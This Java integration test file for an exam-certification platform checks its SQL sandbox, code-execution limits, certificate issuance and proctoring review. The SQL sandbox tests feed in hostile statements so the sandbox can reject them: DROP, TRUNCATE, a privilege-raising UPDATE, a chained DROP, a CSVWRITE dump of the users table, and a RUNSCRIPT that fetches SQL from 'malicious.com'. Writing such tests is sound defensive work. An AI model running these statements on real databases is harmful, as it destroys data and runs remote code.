package com.skillhub.security;

import com.skillhub.SkillHubApplication;
import com.skillhub.dto.CodeSubmission;
import com.skillhub.dto.CodeExecutionResult;
import com.skillhub.dto.PublicCertificateDTO;
import com.skillhub.exception.BusinessException;
import com.skillhub.model.*;
import com.skillhub.model.enums.*;
import com.skillhub.provider.impl.LocalIsolatedSandboxCodeExecutionProvider;
import com.skillhub.repository.*;
import com.skillhub.service.CodingEvaluationService;
import com.skillhub.service.ProfessionalCertificateService;
import com.skillhub.service.SqlEvaluationSandboxService;
import com.skillhub.service.impl.ProfessionalExamEvaluationServiceImpl;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.transaction.annotation.Transactional;

import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.Optional;
import java.util.UUID;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@SpringBootTest(classes = SkillHubApplication.class)
@AutoConfigureMockMvc
@ActiveProfiles("test")
@Transactional
public class ExamSecurityAndUntrustedCodeExecutionIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private SqlEvaluationSandboxService sqlSandboxService;

    @Autowired
    private LocalIsolatedSandboxCodeExecutionProvider localSandboxProvider;

    @Autowired
    private CodingEvaluationService codingEvaluationService;

    @Autowired
    private ProfessionalExamEvaluationServiceImpl evaluationService;

    @Autowired
    private ProfessionalCertificateService certificateService;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private ProfessionalExamRepository examRepository;

    @Autowired
    private ProfessionalExamVersionRepository versionRepository;

    @Autowired
    private ProfessionalExamSectionRepository sectionRepository;

    @Autowired
    private ProfessionalExamQuestionRepository questionRepository;

    @Autowired
    private ProfessionalExamApplicationRepository applicationRepository;

    @Autowired
    private ProfessionalExamAttemptRepository attemptRepository;

    @Autowired
    private ProfessionalExamResultRepository resultRepository;

    @Autowired
    private ProfessionalCertificateRepository certificateRepository;

    private User studentA;
    private User studentB;
    private ProfessionalExam testExam;
    private ProfessionalExamVersion testVersion;
    private ProfessionalExamSection testSection;

    @BeforeEach
    void setUp() {
        studentA = new User();
        studentA.setName("Candidate Alpha");
        studentA.setEmail("alpha_" + UUID.randomUUID().toString().substring(0, 8) + "@skillhub.com");
        studentA.setPassword("SecretPass123!");
        studentA.setRole("STUDENT");
        studentA = userRepository.save(studentA);

        studentB = new User();
        studentB.setName("Candidate Beta");
        studentB.setEmail("beta_" + UUID.randomUUID().toString().substring(0, 8) + "@skillhub.com");
        studentB.setPassword("SecretPass123!");
        studentB.setRole("STUDENT");
        studentB = userRepository.save(studentB);

        testExam = new ProfessionalExam();
        testExam.setTitle("Full Stack Certification Exam");
        testExam.setExamCode("EX-" + UUID.randomUUID().toString().substring(0, 6));
        testExam.setDescription("Assessment Exam");
        testExam.setTrack(ExamTrack.FULL_STACK);
        testExam.setLevel(ExamDifficulty.INTERMEDIATE);
        testExam.setTotalMarks(100);
        testExam.setPassingMarks(60);
        testExam.setMaximumAttempts(3);
        testExam.setActive(true);
        testExam = examRepository.save(testExam);

        testVersion = new ProfessionalExamVersion();
        testVersion.setProfessionalExam(testExam);
        testVersion.setVersionNumber("1.0");
        testVersion.setVersionName("v1.0");
        testVersion.setDurationMinutes(60);
        testVersion.setPassingMarks(60);
        testVersion.setTotalMarks(100);
        testVersion.setPublished(true);
        testVersion.setActive(true);
        testVersion = versionRepository.save(testVersion);

        testSection = new ProfessionalExamSection();
        testSection.setExamVersion(testVersion);
        testSection.setName("Core Section");
        testSection.setDisplayOrder(1);
        testSection = sectionRepository.save(testSection);
    }

    @Test
    @DisplayName("SQL Sandbox: Prohibited Keywords (DROP, UPDATE, ALTER, etc.) are strictly rejected")
    void testSqlSandbox_RejectsDangerousKeywords() {
        String dropQuery = "DROP TABLE users;";
        var res1 = sqlSandboxService.evaluate(dropQuery, "SELECT 1;", null);
        assertFalse(res1.isPassed());
        assertTrue(res1.getMessage().contains("rejected"));

        String updateQuery = "UPDATE users SET role = 'ADMIN';";
        var res2 = sqlSandboxService.evaluate(updateQuery, "SELECT 1;", null);
        assertFalse(res2.isPassed());

        String truncateQuery = "TRUNCATE TABLE payments;";
        var res3 = sqlSandboxService.evaluate(truncateQuery, "SELECT 1;", null);
        assertFalse(res3.isPassed());
    }

    @Test
    @DisplayName("SQL Sandbox: Multi-Statement Chaining & File Functions are strictly rejected")
    void testSqlSandbox_RejectsMultiStatementAndFileFunctions() {
        String multiStatement = "SELECT * FROM employees; DROP TABLE employees;";
        var res1 = sqlSandboxService.evaluate(multiStatement, "SELECT 1;", null);
        assertFalse(res1.isPassed());
        assertTrue(res1.getMessage().contains("Multiple statements"));

        String h2FileScript = "SELECT * FROM CSVWRITE('test.csv', 'SELECT * FROM users');";
        var res2 = sqlSandboxService.evaluate(h2FileScript, "SELECT 1;", null);
        assertFalse(res2.isPassed());

        String runScript = "SELECT * FROM RUNSCRIPT FROM 'http://malicious.com/exploit.sql';";
        var res3 = sqlSandboxService.evaluate(runScript, "SELECT 1;", null);
        assertFalse(res3.isPassed());
    }

    @Test
    @DisplayName("SQL Sandbox: Read-Only Query executes safely in ephemeral database")
    void testSqlSandbox_ExecutesValidSelectSuccessfully() {
        String ddl = "CREATE TABLE products (id INT PRIMARY KEY, name VARCHAR(50), price DECIMAL(10,2));" +
                "INSERT INTO products VALUES (1, 'Book', 15.00), (2, 'Pen', 3.00);";
        String candidateSql = "SELECT name FROM products WHERE price > 10.00;";
        String expectedSql = "SELECT name FROM products WHERE price > 10.00;";

        var res = sqlSandboxService.evaluate(candidateSql, expectedSql, ddl);
        assertTrue(res.isPassed());
        assertEquals(1, res.getRowsMatched());
        assertTrue(res.getMessage().contains("verified successfully"));
    }

    @Test
    @DisplayName("Untrusted Code Sandbox: Strict Output Size and Resource Limits are Enforced")
    void testUntrustedCode_BoundedExecution() {
        CodeSubmission sub = new CodeSubmission();
        sub.setLanguage("python");
        sub.setTimeLimit(2000);
        // Exceeding 64KB source code limit
        sub.setSourceCode("# comment\n".repeat(8000));

        CodeExecutionResult result = localSandboxProvider.execute(sub);
        assertEquals(SubmissionStatus.COMPILATION_ERROR, result.getStatus());
        assertTrue(result.getErrorMessage().contains("SOURCE_CODE_EXCEEDS_MAX_SIZE"));
    }

    @Test
    @DisplayName("Idempotent Certificate Issuance: Duplicate issuance returns existing certificate")
    void testCertificateIssuance_IsIdempotent() {
        ProfessionalExamApplication app = new ProfessionalExamApplication();
        app.setUser(studentA);
        app.setProfessionalExam(testExam);
        app.setExamVersion(testVersion);
        app.setStatus(ApplicationStatus.APPROVED);
        app.setPaymentStatus(PaymentStatus.SUCCESS);
        app.setApplicationNumber("APP-" + UUID.randomUUID().toString().substring(0, 8));
        app = applicationRepository.save(app);

        ProfessionalExamAttempt attempt = new ProfessionalExamAttempt();
        attempt.setApplication(app);
        attempt.setStudent(studentA);
        attempt.setExamVersion(testVersion);
        attempt.setStartedAt(LocalDateTime.now().minusMinutes(20));
        attempt.setStatus(AttemptStatus.EVALUATED);
        attempt = attemptRepository.save(attempt);

        ProfessionalExamResult examResult = new ProfessionalExamResult();
        examResult.setAttempt(attempt);
        examResult.setTotalMarks(100);
        examResult.setObtainedMarks(BigDecimal.valueOf(85));
        examResult.setPercentage(85.0);
        examResult.setStatus("PASS");
        examResult.setGrade("MERIT");
        examResult = resultRepository.save(examResult);

        // First issuance
        ProfessionalCertificate cert1 = certificateService.issueCertificate(examResult.getId());
        assertNotNull(cert1);
        assertNotNull(cert1.getCertificateId());
        assertNotNull(cert1.getVerificationToken());

        // Repeated issuance
        ProfessionalCertificate cert2 = certificateService.issueCertificate(examResult.getId());
        assertEquals(cert1.getId(), cert2.getId());
        assertEquals(cert1.getCertificateId(), cert2.getCertificateId());
    }

    @Test
    @DisplayName("Certificate Issuance: Cannot issue certificate for failed exam results")
    void testCertificateIssuance_RejectsFailedExam() {
        ProfessionalExamApplication app = new ProfessionalExamApplication();
        app.setUser(studentA);
        app.setProfessionalExam(testExam);
        app.setExamVersion(testVersion);
        app.setStatus(ApplicationStatus.APPROVED);
        app.setPaymentStatus(PaymentStatus.SUCCESS);
        app.setApplicationNumber("APP-" + UUID.randomUUID().toString().substring(0, 8));
        app = applicationRepository.save(app);

        ProfessionalExamAttempt attempt = new ProfessionalExamAttempt();
        attempt.setApplication(app);
        attempt.setStudent(studentA);
        attempt.setExamVersion(testVersion);
        attempt.setStartedAt(LocalDateTime.now().minusMinutes(20));
        attempt.setStatus(AttemptStatus.EVALUATED);
        attempt = attemptRepository.save(attempt);

        ProfessionalExamResult examResult = new ProfessionalExamResult();
        examResult.setAttempt(attempt);
        examResult.setTotalMarks(100);
        examResult.setObtainedMarks(BigDecimal.valueOf(40));
        examResult.setPercentage(40.0);
        examResult.setStatus("FAIL");
        examResult.setGrade("FAIL");
        examResult = resultRepository.save(examResult);

        final Long failedResultId = examResult.getId();
        assertThrows(BusinessException.class, () -> certificateService.issueCertificate(failedResultId));
    }

    @Test
    @DisplayName("Public Certificate Verification: Supports verification by Token and Certificate ID")
    void testPublicCertificateVerification_ByIdAndToken() {
        ProfessionalExamApplication app = new ProfessionalExamApplication();
        app.setUser(studentA);
        app.setProfessionalExam(testExam);
        app.setExamVersion(testVersion);
        app.setStatus(ApplicationStatus.APPROVED);
        app.setPaymentStatus(PaymentStatus.SUCCESS);
        app.setApplicationNumber("APP-" + UUID.randomUUID().toString().substring(0, 8));
        app = applicationRepository.save(app);

        ProfessionalExamAttempt attempt = new ProfessionalExamAttempt();
        attempt.setApplication(app);
        attempt.setStudent(studentA);
        attempt.setExamVersion(testVersion);
        attempt.setStartedAt(LocalDateTime.now().minusMinutes(20));
        attempt.setStatus(AttemptStatus.EVALUATED);
        attempt = attemptRepository.save(attempt);

        ProfessionalExamResult examResult = new ProfessionalExamResult();
        examResult.setAttempt(attempt);
        examResult.setTotalMarks(100);
        examResult.setObtainedMarks(BigDecimal.valueOf(95));
        examResult.setPercentage(95.0);
        examResult.setStatus("PASS");
        examResult.setGrade("DISTINCTION");
        examResult = resultRepository.save(examResult);

        ProfessionalCertificate cert = certificateService.issueCertificate(examResult.getId());

        // Verify by human-readable Certificate ID
        Optional<PublicCertificateDTO> byId = certificateService.verifyPublicCertificate(cert.getCertificateId());
        assertTrue(byId.isPresent());
        assertTrue(byId.get().isValid());

        // Verify by random verification token
        Optional<PublicCertificateDTO> byToken = certificateService.verifyByToken(cert.getVerificationToken());
        assertTrue(byToken.isPresent());
        assertTrue(byToken.get().isValid());
    }

    @Test
    @DisplayName("Proctoring Signals: Excessive warnings flag attempt for review without premature termination")
    void testProctoringSignals_FlagsForReviewWithoutPrematureTermination() {
        ProfessionalExamApplication app = new ProfessionalExamApplication();
        app.setUser(studentA);
        app.setProfessionalExam(testExam);
        app.setExamVersion(testVersion);
        app.setStatus(ApplicationStatus.APPROVED);
        app.setPaymentStatus(PaymentStatus.SUCCESS);
        app.setApplicationNumber("APP-" + UUID.randomUUID().toString().substring(0, 8));
        app = applicationRepository.save(app);

        ProfessionalExamAttempt attempt = new ProfessionalExamAttempt();
        attempt.setApplication(app);
        attempt.setStudent(studentA);
        attempt.setExamVersion(testVersion);
        attempt.setStartedAt(LocalDateTime.now().minusMinutes(30));
        attempt.setStatus(AttemptStatus.IN_PROGRESS);
        // Candidate had 3 face/tab warnings logged as signals
        attempt.setProctoringWarnings(3);
        attempt.setRiskScore(60);
        attempt = attemptRepository.save(attempt);

        ProfessionalExamResult evaluated = evaluationService.evaluateAttempt(attempt.getId());

        // Must be FLAGGED_FOR_REVIEW, NOT prematurely marked 0% or terminated
        assertEquals("FLAGGED_FOR_REVIEW", evaluated.getStatus());
        assertEquals("UNDER_REVIEW", evaluated.getGrade());

        // Certificate should NOT be auto-issued when flagged for review
        Optional<ProfessionalCertificate> cert = certificateRepository.findByResultId(evaluated.getId());
        assertTrue(cert.isEmpty());
    }
}
